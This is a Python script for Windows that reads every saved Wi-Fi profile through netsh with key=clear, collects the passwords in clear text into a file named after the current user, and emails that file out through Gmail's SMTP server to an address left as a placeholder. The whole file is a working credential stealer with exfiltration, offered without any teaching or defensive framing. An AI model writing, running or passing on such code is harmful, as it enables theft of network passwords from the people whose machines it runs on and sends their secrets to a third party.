import subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import getpass


def extract_wifi_passwords():

    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('utf-8', 'ignore').split('\n')
    profiles = [i.split(':')[1].strip() for i in profiles_data if ':' in i]
    profiles_clear = [profile for profile in profiles if profile]

    for profile in profiles_clear:
        profile_info = subprocess.check_output(f'netsh wlan show profiles name="{profile}" key=clear').decode('utf-8', 'ignore').split('\n')

        try:
            password = profile_info[32].split(':')[1].strip()
        except IndexError:
            password = None

        with open(file=f'wifi_passwords ({getpass.getuser()}).txt', mode='a', encoding='utf-8') as file:
            file.write(f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n')



    sender = "email_sender"
    password = 'password'

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    try:
        server.login(sender, password)
        msg=MIMEMultipart()
        with open(f"wifi_passwords ({getpass.getuser()}).txt") as f:
            file = MIMEText(f.read())
        msg.attach(file)
        server.sendmail(sender, "email_to", msg.as_string())

        print("The message was sent successfully!")
    except Exception as _ex:
        print(f"{_ex}\nCheck your login or password please!")

def main():
    extract_wifi_passwords()

if __name__ == "__main__":
    main()
